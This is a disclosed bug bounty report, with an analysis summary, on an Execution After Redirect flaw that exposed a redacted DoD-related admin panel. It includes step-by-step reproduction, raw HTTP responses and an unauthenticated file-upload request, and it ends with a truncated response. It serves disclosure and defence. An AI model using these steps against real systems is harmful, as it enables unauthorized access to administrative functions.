# Unauthenticated Access to Admin Panel via Execution After Redirect (EAR)

## Metadata
- **Source:** HackerOne
- **Report:** 1397564 | https://hackerone.com/reports/1397564
- **Submitted:** 2021-11-10
- **Reporter:** palaziv
- **Program:** Undisclosed (Government/DoD related based on content markings)
- **Bounty:** Not specified in writeup
- **Severity:** Critical
- **Vuln:** Broken Authentication, Execution After Redirect (EAR), Client-Side Security Controls Bypass, Improper Access Control
- **CVEs:** None
- **Category:** uncategorised

## Summary
An admin panel can be accessed without authentication by intercepting a 302 redirect response and modifying the HTTP status code to 200, allowing the browser to render the admin content instead of following the redirect. This allows unauthenticated attackers to access all administrative functions including file upload, deletion, and modification capabilities.

## Attack scenario
1. Attacker initiates authentication flow by clicking 'Authenticate' button on application
2. Application sends HTTP POST request to authentication endpoint which responds with 302 Found and Location header
3. Attacker intercepts the redirect response in a proxy tool (e.g., Burp Suite)
4. Attacker modifies HTTP response status code from 302 to 200 OK while keeping the response body intact
5. Browser renders the response body containing the admin panel instead of following the redirect
6. Attacker gains access to admin functions for uploading, deleting, and modifying files without valid credentials

## Root cause
The application returns the admin panel HTML content in the 302 redirect response body. The server relies solely on the HTTP status code to prevent content consumption, failing to implement server-side authentication checks before rendering sensitive administrative functions. Client-side redirect handling is the only security control, which can be trivially bypassed.

## Attacker mindset
An attacker recognizes that HTTP redirect responses often contain response bodies that browsers ignore, but which can be rendered by modifying the status code. The attacker understands HTTP protocol mechanics and uses an interception proxy to manipulate responses, demonstrating knowledge of common web application security weaknesses and the ability to bypass client-enforced security controls.

## Defensive takeaways
- Never rely on HTTP status codes or client-side redirects as security controls; enforce authentication on the server-side before sending any sensitive content
- Do not include sensitive administrative content in redirect responses; only send the Location header
- Implement server-side session validation and authentication checks for every endpoint, regardless of redirect status codes
- Use proper HTTP semantics: 302/303 responses should contain minimal/no body content, only Location header
- Apply defense-in-depth: even if content is returned, ensure authentication middleware validates every request before reaching handlers
- Avoid relying on response modification as a security boundary; implement actual access controls

## Variant hunting
Scan for other redirect endpoints that return admin/sensitive content in 302/301/307 response bodies
Test all authentication flows for similar patterns where content is sent alongside redirect instructions
Check other applications on the same domain for identical vulnerable authentication patterns
Review related report #1394910 mentioned in writeup for shared codebase vulnerabilities
Search for other endpoints that may process requests but rely on status codes rather than actual validation

## MITRE ATT&CK
- T1190
- T1566
- T1199
- T1021

## Notes
This vulnerability represents a critical authentication bypass that appears to be a systemic issue (referenced as existing in report #1394910 on another system), suggesting shared vulnerable code across multiple applications. The vulnerability is trivial to exploit requiring only a proxy tool and HTTP status code modification. The presence of DoD distribution markings indicates sensitive government systems are affected.

## Full report
<details><summary>Expand</summary>

**Description:**
The admin panel at https://██████████/████████ and all its functions can be accessed without authentication. This is basically the same vulnerability as in #1394910, just on another system.

## Impact

An attacker is able to use the administrative functions in order to upload, delete or modify files.

## System Host(s)
███

## Affected Product(s) and Version(s)
██████████

## CVE Numbers


## Steps to Reproduce
* Navigate to https://███/ and click on the "Authenticate ██████████" button
* Notice how the application first sends an HTTP POST request to https://███████/████████ which should redirect to https://██████/██████████ (`Location: █████`). Navigating to  https://███/██████ redirects to https://█████/███
* Looking at the response to https://█████/███ I noticed that even though the server sent back a 302 status code with a header `Location: /██████████` the response was quite long
* I browsed to https://█████████/████████, intercepted the response in Burp, changed the status code from `302 Found` to `200 OK` and was presented with the admin panel (this kind of attack is called [Execution after Redirect](https://owasp.org/www-community/attacks/Execution_After_Redirect_(EAR))). Below you can see the unmodified response containing links to the ██████ Admin Functions:

```
HTTP/1.1 302 Found
Date: Wed, 10 Nov 2021 14:28:15 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Cache-Control: no-store, no-cache, must-revalidate
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Location: /██████
Pragma: no-cache
Set-Cookie: █████████; path=/; HttpOnly
Set-Cookie: ███████; Path=/; HttpOnly; Secure
X-Vcap-Request-Id: 3c110e5d-196e-46f4-503d-222157e0c465
Strict-Transport-Security: max-age=31536000; includeSubDomains
██████████████████
Content-Length: 4266


<!-- Unused LIMDIS banner in WWW  

<table align="center" width="800" border="1" cellspacing="1"
	cellpadding="1" bgcolor="#008000">
	<tr>
		<td style="color: #FFF";  align="center">LIMITED DISTRIBUTION<br> <font
			size="2px">Distribution authorized to DoD, IAW 10 U.S.C. §§ 130 &
				455. Release authorized to U.S. DoD contractors, IAW 48 C.F.R. §
				252.245-7000. Refer other requests to: Headquarters, ██████████, ATTN:
				Release Of ficer, ███████, ██████,
				█████. Destroy IAW DoDI 5030.59. Removal of this caveat is
				prohibited.</font></td>
	</tr>
</table>
--><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html lang='en' xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Admin</title>
<script src="../███████/SpryAssets/SpryMenuBar.js" type="text/javascript"></script>
<link href="../█████/SpryAssets/SpryMenuBarHorizontal.css"
	rel="stylesheet" type="text/css" />
</head>

<body>
	<table align="center" bgcolor="50D6EE" border="3">
		<tr>
			<td colspan="2" align="center"><img
				src="../███████/images/███_banner_top.jpg" /></td>
		</tr>
		<tr>
			<td align="center"><br />
            Welcome to ███  You are on World Wide Web<br /></td>
		</tr>
		<tr>
			<td>
				<div align="center">
					<ul id="MenuBar1" class="MenuBarHorizontal">
						<li><a class="MenuBarItemSubmenu" href="#">Home</a></li>
						<li><a class="MenuBarItemSubmenu" href="#">█████ Admin Functions</a>
							<ul>
								<li><a href="s3html.php">UpLoad Weekly</a></li>
								<li><a href="../███/██████/verifyfile.php">Verify File Dates</a></li>
								<li><a href="#">Add Single File</a>
									<ul>
										<li><a href="../██████████/██████████/addnewfile.php" target="new">VDU ADD
										</a></li>
										<li><a href="../██████/██████████/addvpf.php" target="new">VPF ADD</a></li>
										<li><a href="../██████████/█████/█████class.php" target="new">Change
												Classification</a></li>
										<li><a href="../████████/██████/██████████bull.php">New ███</a></li>
										<li><a href="../██████████/█████████/███████loadgraph.php" target="new">Graphic
												ADD</a></li>
										<li><a href="../██████/████████/██████delgrp.php">Delete 'ALL' Graphic
												Files</a></li>
									</ul></li>
								<li><a href="#">Upload New Editions</a>
									<ul>
										<li><a href="../████████/█████/██████loadvdu.php" target="new">Install
												New Base VDU </a></li>
										<li><a href="../███/██████████/█████loadvpf.php" target="new">Install
												New base VPF </a></li>
										<li><a href="../█████████/██████████/███████loadtxt.php" target="new">Install/Update
												█████████##.txt</a></li>
										<li><a href="../███████/███████/███████newgraph.php" target="new">Replace
												all Graphic Files</a></li>
									</ul></li>
								<li><a href="#">Modify Single File**</a>
									<ul>
										<li><a href="../██████/█████████/██████mod.php">Modify ██████████ Chart</a></li>
										<li><a href="../██████████/███████/█████vitem.php">Modify Library Specific
												File</a></li>
										<li><a href="../████████/███/█████viteml.php">Stop ALL VPFS from
												being viewed from specific Region</a></li>
										<li><a href="../█████/███/█████████graphic.php">Modify Graphic
												Specific File</a></li>
									</ul></li>
								<li><a href="../███████/████/██████████vpfdel.php">DELETE VPF, VDU,
										Graphics</a></li>
								<li><a href="#">Change Status of Deleted and New Records</a>
									<ul>
										<li><a href="../████/█████/████████deldel.php">Change Record Status
												To an ADDed or DELeted VDU Record</a></li>
									</ul></li>
								<li><a href="../████/█████/█████_documentation.php">████
										Documentation</a></li>
							</ul></li>
						<li><a href="dssLogout.php">Logout</a></li>
					</ul>
				</div>
				<p>&nbsp;</p>
				<p>&nbsp;</p>
				<p>
					<br /> <br />
				</p>
			</td>
		</tr>
		<tr>
			<td><br /> <br /></td>
		</tr>
		<tr align="center">
		</tr>
	</table>
	<script type="text/javascript">
    var MenuBar1 = new Spry.Widget.MenuBar("MenuBar1", {imgDown:"../SpryAssets/SpryMenuBarDownHover.gif", imgRight:"../SpryAssets/SpryMenuBarRightHover.gif"});
</script>
</body>
</html>

```

* The functions allow to upload, modify and to delete █████ files and can all be used completely unauthenticated. Following an example in which I upload a file; this upload function can be accessed from https://█████/██████/████/█████████bull.php. Note that the request has no session cookie:

```
POST /████/███████/███████bulla.php HTTP/1.1
Host: █████
Content-Length: 401
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://█████
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVxWfTBx5ZkXMXVG2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: https://███████/█████/████/████████bull.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
X-Bug-Bounty: HackerOne-palaziv
X-Bug-Bounty: BurpSuitePro

------WebKitFormBoundaryVxWfTBx5ZkXMXVG2
Content-Disposition: form-data; name="bdate"

1970-01-01
------WebKitFormBoundaryVxWfTBx5ZkXMXVG2
Content-Disposition: form-data; name="userfile1"; filename="test.txt"
Content-Type: text/plain

test

------WebKitFormBoundaryVxWfTBx5ZkXMXVG2
Content-Disposition: form-data; name="buttonm"

Begin Uploads
------WebKitFormBoundaryVxWfTBx5ZkXMXVG2--
```

Response:

```
HTTP/1.1 302 Found
Date: Wed, 10 Nov 2021 14:44:57 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Cache-Control: no-store, no-cache, must-revalidate
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Location: ../../█████████/404.html
Pragma: no-cache
Set-Cookie: JSESSIONID=fceoa3cccho3q5dc6ahec3ghav; path=/; HttpOnly
Set-Cookie: ███; Path=/; HttpOnly; Secure
X-Vcap-Request-Id: ffb083d0-f29b-4623-5249-9f0

</details>

---
*Analysed by Claude on 2026-05-24*
